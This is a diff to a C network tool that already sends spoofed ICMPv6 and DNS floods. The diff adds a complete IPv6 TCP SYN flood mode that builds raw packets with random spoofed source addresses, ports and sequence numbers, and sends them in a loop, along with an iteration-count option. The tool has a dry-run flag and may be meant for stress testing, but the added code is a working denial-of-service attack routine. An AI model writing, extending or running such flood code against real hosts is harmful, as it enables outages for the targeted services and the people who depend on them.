@@ -14,6 +14,7 @@
 #include <netinet/ip6.h>
 #include <netinet/icmp6.h>
 #include <netinet/udp.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <time.h>
@@ -33,7 +34,7 @@ struct {
 	} dst;
 	struct {
 		struct timespec ts_last_report;
-		size_t last_it_cnt;
+		uint64_t last_it_cnt;
 	} bm;
 	struct {
 		rnd_well512_t well512;
@@ -70,10 +71,12 @@ struct {
 		uint16_t rtype;
 	} dns;
 	uint16_t dst_port;
+	uint64_t count;
 } param;
 
-void init_params (void) {
+static void init_params (void) {
 	param.dns.rtype = 16; // TXT
+	param.count = UINT64_MAX;
 }
 
 static void init_global (void) {
@@ -119,13 +122,14 @@ static void genrnd (const size_t len, void *out) {
 static void print_help (FILE *f) {
 	fprintf(f,
 "Usage: %s [-hdq] [--help] [--dryrun] [--quiet] [-p|--dst-port PORT]"
-"       [-T|--rtype RTYPE] [-R|--rname RNAME] <--mode|-m MODE> [--]\n"
-"       SRC_NET DST_ADDR\n"\
-"MODE:        'ptb_flood_icmp6_echo' | 'dns_flood'\n"
+"       [-c|--count COUNT] [-T|--rtype RTYPE] [-R|--rname RNAME]\n"
+"       <--mode|-m MODE> [--] SRC_NET DST_ADDR\n"\
+"MODE:        'ptb_flood_icmp6_echo' | 'dns_flood' | 'syn_flood'\n"
 "SRC_NET:     2001:db8:1:2::/64\n"
 "DST_ADDR:    any string accepted by getaddrinfo()\n"
 "Options:\n"
 "  -m, --mode MODE      run in specified mode\n"
+"  -c, --count COUNT    number of iterations\n"
 "  -p, --dst-port PORT  override destination port\n"
 "  -R, --rname RNAME    QNAME to use in queries\n"
 "  -T, --rtype RTYPE    numeric QTYPE to use in queries (default: 16 (TXT))\n"
@@ -244,7 +248,7 @@ static void ts_sub (
 }
 
 static void do_report_print (
-		const size_t it_period,
+		const uint64_t it_period,
 		const struct timespec *ts_elapsed)
 {
 	lock_ouput(); {
@@ -260,7 +264,7 @@ static void do_report_print (
 	unlock_ouput();
 }
 
-static void do_report (const size_t cur_it) {
+static void do_report (const uint64_t cur_it) {
 	struct timespec ts_now, ts_elapsed;
 
 	clock_gettime(CLOCK_MONOTONIC, &ts_now);
@@ -303,7 +307,7 @@ static void mount_attack_icmp6_ptb (void) {
 	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
 	genrnd(sizeof(uint32_t), snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8);
 
-	for (size_t it = 0; ; it += 1) {
+	for (uint64_t it = 0; it < param.count ; it += 1) {
 		genrnd_src_addr(&snd_buf.ih6.ip6_src);
 		memcpy(&snd_buf.body.ih6.ip6_dst, &snd_buf.ih6.ip6_src, 16);
 
@@ -390,7 +394,7 @@ static bool label_rname (char *label, uint8_t len, void *) {
 	return true;
 }
 
-void mount_attack_dns_flood (void) {
+static void mount_attack_dns_flood (void) {
 	struct {
 		struct ip6_hdr ih6;
 		struct udphdr udp;
@@ -448,7 +452,7 @@ void mount_attack_dns_flood (void) {
 	snd_buf.data[gctx.dns.rname.len + 25] = 0x00;
 	snd_buf.data[gctx.dns.rname.len + 26] = 0x00;
 
-	for (size_t it = 0; ; it += 1) {
+	for (uint64_t it = 0; it < param.count; it += 1) {
 		genrnd_src_addr(&snd_buf.ih6.ip6_src);
 
 		// ID
@@ -497,6 +501,66 @@ static int main_dns_flood (void) {
 	seedrnd();
 
 	mount_attack_dns_flood();
+
+	return 0;
+}
+
+static void mount_attack_syn_flood (void) {
+	struct {
+		struct ip6_hdr ih6;
+		struct tcphdr tcp;
+	} snd_buf = { 0, };
+	ssize_t fr;
+
+	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
+	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_TCP;
+	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons((uint16_t)sizeof(struct tcphdr));
+
+	snd_buf.tcp.th_dport = htons(param.dst_port);
+	snd_buf.tcp.th_off = sizeof(struct tcphdr) / 4;
+	snd_buf.tcp.th_flags = TH_SYN;
+	snd_buf.tcp.th_win = 0xffff;
+
+	for (uint64_t it = 0; it < param.count; it += 1) {
+		genrnd_src_addr(&snd_buf.ih6.ip6_src);
+
+		genrnd(sizeof(snd_buf.tcp.th_seq), &snd_buf.tcp.th_seq);
+
+		genrnd(2, &snd_buf.tcp.th_sport);
+		snd_buf.tcp.th_sport = htons((snd_buf.tcp.th_sport % 59975) + 1025);
+		snd_buf.tcp.th_sum = 0;
+		snd_buf.tcp.th_sum = htons(calc_chksum6(
+			&snd_buf.ih6,
+			(const uint8_t*)&snd_buf.tcp,
+			sizeof(snd_buf.tcp),
+			NULL,
+			0
+		));
+
+		errno = 0;
+		fr = param.flags.dryrun ? 0 : sendto(
+			gctx.fd.sck,
+			&snd_buf,
+			sizeof(struct ip6_hdr) + sizeof(struct tcphdr),
+			MSG_NOSIGNAL,
+			(const struct sockaddr*)&param.dst.sa,
+			sizeof(struct sockaddr_in6));
+
+		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
+			report_sent(&snd_buf.ih6.ip6_src, errno);
+		}
+		if (!param.flags.quiet) {
+			do_report(it);
+		}
+	}
+}
+
+static int main_syn_flood (void) {
+	seedrnd();
+
+	mount_attack_syn_flood();
 
 	return 0;
 }
@@ -568,13 +632,14 @@ static bool parse_param (const int argc, const char **argv) {
 		{ "rname",    true,  NULL, 'R' },
 		{ "rtype",    true,  NULL, 'T' },
 		{ "dst-port", true,  NULL, 'p' },
+		{ "count",    true,  NULL, 'c' },
 	};
 	int loi = -1;
 	int fr;
 	bool fallthrough = false;
 
 	while (true) {
-		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:", LOPTS, &loi);
+		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:R:p:c:", LOPTS, &loi);
 		if (fr < 0) {
 			break;
 		}
@@ -600,6 +665,14 @@ static bool parse_param (const int argc, const char **argv) {
 			if (sscanf(optarg, "%"SCNu16, &param.dst_port) != 1) {
 				errno = EINVAL;
 				fprintf(stderr, ARGV0": -p %s: ", optarg);
+				perror(NULL);
+				return false;
+			}
+			break;
+		case 'c':
+			if (sscanf(optarg, "%"SCNu64, &param.count) != 1 || param.count == 0) {
+				errno = EINVAL;
+				fprintf(stderr, ARGV0": -c %s: ", optarg);
 				perror(NULL);
 				return false;
 			}
@@ -723,6 +796,15 @@ int main (const int argc, const char **argv) {
 		}
 
 		ec = main_dns_flood();
+	}
+	else if (strcmp(param.mode, "syn_flood") == 0) {
+		if (param.dst_port == 0) {
+			fprintf(stderr, ARGV0": missing option -p. Run with -h option for help\n");
+			ec = 2;
+			goto END;
+		}
+
+		ec = main_syn_flood();
 	}
 	else {
 		fprintf(stderr, ARGV0": ");
